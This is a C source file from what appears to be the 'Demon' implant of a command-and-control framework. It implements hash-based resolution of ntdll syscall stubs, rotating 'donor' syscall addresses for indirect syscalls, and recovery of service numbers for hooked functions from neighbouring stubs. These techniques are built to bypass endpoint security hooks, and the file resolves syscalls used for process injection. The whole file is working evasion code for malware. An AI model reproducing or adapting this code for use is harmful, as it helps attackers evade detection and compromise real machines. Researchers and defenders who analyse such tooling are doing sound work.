#include <Demon.h>

#include <common/Defines.h>
#include <core/Syscalls.h>
#include <core/Win32.h>

/*!
 * Initialize syscall addr + ssn
 * @param Ntdll
 * @return
 */
BOOL SysInitialize(
    IN PVOID Ntdll
) {
    PVOID DonorFunc = NULL;

    if ( ! Ntdll ) {
        return FALSE;
    }

    /* Donor function hashes — rarely-hooked ntdll functions for syscall instruction harvesting */
    ULONG DonorHashes[] = {
        H_FUNC_NTADDBOOTENTRY,
        H_FUNC_NTQUERYTIMERRESOLUTION,
        H_FUNC_NTFLUSHWRITEBUFFER,
        H_FUNC_NTQUERYPERFORMANCECOUNTER,
        H_FUNC_NTQUERYDEBUGFILTERSTATE,
        H_FUNC_NTSETTIMERRESOLUTION,
        H_FUNC_NTQUERYDEFAULTLOCALE,
        H_FUNC_NTQUERYDEFAULTUILANGUAGE,
    };

    Instance->Syscall.SysDonorCount = 0;
    Instance->Syscall.SysDonorIndex = 0;

#if _M_IX86
    if ( IsWoW64() )
    {
        Instance->Syscall.SysDonors[0] = __readfsdword(0xC0);
        Instance->Syscall.SysDonorCount = 1;
        PRINTF( "Donor[0]: resolved syscall addr %p from WoW64 TEB\n", Instance->Syscall.SysDonors[0] )
    }
    else
#endif
    {
        for ( UINT32 i = 0; i < sizeof( DonorHashes ) / sizeof( DonorHashes[0] ); i++ )
        {
            PVOID SysAddr = NULL;

            DonorFunc = LdrFunctionAddr( Ntdll, DonorHashes[i] );
            if ( DonorFunc )
            {
                SysExtract( DonorFunc, TRUE, NULL, &SysAddr );
                if ( SysAddr )
                {
                    Instance->Syscall.SysDonors[Instance->Syscall.SysDonorCount] = SysAddr;
                    Instance->Syscall.SysDonorCount++;
                    PRINTF( "Donor[%d]: resolved syscall addr %p from hash 0x%08x\n",
                            Instance->Syscall.SysDonorCount - 1, SysAddr, DonorHashes[i] )
                }
            }
        }
    }

    if ( Instance->Syscall.SysDonorCount == 0 )
    {
        PUTS_DONT_SEND( "CRITICAL: No syscall donor addresses resolved!" )
        return FALSE;
    }

    PRINTF( "Syscall donor pool: %d addresses resolved\n", Instance->Syscall.SysDonorCount )

    /* Resolve Ssn */
    SYS_EXTRACT( NtOpenThread )
    SYS_EXTRACT( NtOpenThreadToken )
    SYS_EXTRACT( NtOpenProcess )
    SYS_EXTRACT( NtTerminateProcess )
    SYS_EXTRACT( NtOpenProcessToken )
    SYS_EXTRACT( NtDuplicateToken )
    SYS_EXTRACT( NtQueueApcThread )
    SYS_EXTRACT( NtSuspendThread )
    SYS_EXTRACT( NtResumeThread )
    SYS_EXTRACT( NtCreateEvent )
    SYS_EXTRACT( NtCreateThreadEx )
    SYS_EXTRACT( NtDuplicateObject )
    SYS_EXTRACT( NtGetContextThread )
    SYS_EXTRACT( NtSetContextThread )
    SYS_EXTRACT( NtQueryInformationProcess )
    SYS_EXTRACT( NtQuerySystemInformation )
    SYS_EXTRACT( NtWaitForSingleObject )
    SYS_EXTRACT( NtAllocateVirtualMemory )
    SYS_EXTRACT( NtWriteVirtualMemory )
    SYS_EXTRACT( NtReadVirtualMemory )
    SYS_EXTRACT( NtFreeVirtualMemory )
    SYS_EXTRACT( NtUnmapViewOfSection )
    SYS_EXTRACT( NtProtectVirtualMemory )
    SYS_EXTRACT( NtTerminateThread )
    SYS_EXTRACT( NtAlertResumeThread )
    SYS_EXTRACT( NtSignalAndWaitForSingleObject )
    SYS_EXTRACT( NtQueryVirtualMemory )
    SYS_EXTRACT( NtQueryInformationToken )
    SYS_EXTRACT( NtQueryInformationThread )
    SYS_EXTRACT( NtQueryObject )
    SYS_EXTRACT( NtClose )
    SYS_EXTRACT( NtSetEvent )
    SYS_EXTRACT( NtSetInformationThread )
    SYS_EXTRACT( NtSetInformationVirtualMemory )
    SYS_EXTRACT( NtGetNextThread )

    return TRUE;
}

/* Get next rotating donor address */
PVOID SysGetDonorAddress( VOID )
{
    if ( Instance->Syscall.SysDonorCount == 0 )
        return NULL;

    PVOID Addr = Instance->Syscall.SysDonors[Instance->Syscall.SysDonorIndex % Instance->Syscall.SysDonorCount];
    Instance->Syscall.SysDonorIndex++;
    return Addr;
}

/*!
 * extract syscall service number (SSN) and or
 * syscall instruction address
 * @param Function       Native function address to extract Ssn/SysAddr from
 * @param ResolveHooked  if the function should call FindSsnOfHookedSyscall upon failure
 * @param Ssn            extracted ssn
 * @param Addr           extracted sys addr
 * @return               if extracting the syscall was successful
 */
BOOL SysExtract(
    IN  PVOID  Function,
    IN  BOOL   ResolveHooked,
    OUT PWORD  Ssn,
    OUT PVOID* SysAddr
) {
    ULONG Offset      = 0;
    BYTE  SsnLow      = 0;
    BYTE  SsnHigh     = 0;
    BOOL  Success     = FALSE;

    /* check args */
    if ( ! Function )
    {
        PUTS( "Function address is not defined" )
        return FALSE;
    }

    if ( ! Ssn && ! SysAddr )
    {
        PRINTF( "No Ssn and SysAddr pointers set for function at 0x%p\n", Function )
        return FALSE;
    }

    do {
        /* check if current instruction is a 'ret' (end of function) */
        if ( DREF_U8( Function + Offset ) == SYS_ASM_RET ) {
            break;
        }

#if _WIN64
        /* check current instructions for:
         *   mov r10, rcx
         *   mov rcx, [ssn]
         */
        if ( DREF_U8( Function + Offset + 0x0 ) == 0x4C &&
             DREF_U8( Function + Offset + 0x1 ) == 0x8B &&
             DREF_U8( Function + Offset + 0x2 ) == 0xD1 &&
             DREF_U8( Function + Offset + 0x3 ) == 0xB8 )
#else
        /* check current instructions for:
         *   mov eax, [ssn]
         */
        if ( DREF_U8( Function + Offset + 0x0 ) == 0xB8 )
#endif
        {
            /* if the Ssn param has been specified try to get the Ssn of the function */
            if ( Ssn )
            {
                SsnLow  = DREF_U8( Function + Offset + SSN_OFFSET_1 );
                SsnHigh = DREF_U8( Function + Offset + SSN_OFFSET_2 );
                *Ssn    = ( SsnHigh << 0x08 ) | SsnLow;
                Success = TRUE;
            }

            /* if SysAddr has been specified then try to get the native function syscall instruction */
            if ( SysAddr )
            {
                Success = FALSE;

#if _M_IX86
                if ( IsWoW64() )
                {
                    *SysAddr = __readfsdword(0xC0);
                    Success  = TRUE;
                    break;
                }
#endif

                for ( int i = 0; i < SYS_RANGE; i++ )
                {
                    /* check if the current ( function + offset + i ) is 'syscall' instruction */
                    if ( DREF_U16( Function + Offset + i ) == SYSCALL_ASM ) {
                        *SysAddr = C_PTR( Function + Offset + i );
                        Success  = TRUE;
                        break;
                    }
                }
            }

            /* we should be finished */
            break;
        }

        Offset++;
    } while ( TRUE );

    if ( ! Success && Ssn && ResolveHooked ) {
        Success = FindSsnOfHookedSyscall( Function, Ssn );
    }

    if ( ! Success )
    {
        if ( Ssn ) {
            PRINTF( "Could not resolve the Ssn of function at 0x%p\n", Function )
        }

        if ( SysAddr ) {
            PRINTF( "Could not resolve the SysAddr of function at 0x%p\n", Function )
        }
    }

    return Success;
}

/*
 * If a function is hooked, we can't obtain the Ssn directly.
 * Instead, we look for the Ssn of a neighbouring syscalls and add/subtract
 * to their Ssn according to their distance.
 * WARNING: This only works if Ssn are incremental!
 */
BOOL FindSsnOfHookedSyscall(
    IN  PVOID  Function,
    OUT PWORD  Ssn
) {
    UINT32 SyscallSize      = 0;
    PVOID  NeighbourSyscall = NULL;
    WORD   NeighbourSsn     = NULL;

    PRINTF( "The syscall at address 0x%p seems to be hooked, trying to resolve its Ssn via neighbouring syscalls...\n", Function )

    if ( ! ( SyscallSize = GetSyscallSize() ) ) {
        PUTS( "Failed to obtain the size of the syscalls stub" )
        return FALSE;
    }


    for ( UINT32 i = 1; i < 500; ++i )
    {
        // try with a syscall above ours
        NeighbourSyscall = C_PTR( U_PTR( Function ) + ( SyscallSize * i ) );
        if( SysExtract( NeighbourSyscall, FALSE, &NeighbourSsn, NULL ) )
        {
            *Ssn = NeighbourSsn - i;
            return TRUE;
        }

        // try with a syscall below ours
        NeighbourSyscall = C_PTR( U_PTR( Function ) - ( SyscallSize * i ) );
        if( SysExtract( NeighbourSyscall, FALSE, &NeighbourSsn, NULL ) )
        {
            *Ssn = NeighbourSsn + i;
            return TRUE;
        }
    }

    return FALSE;
}
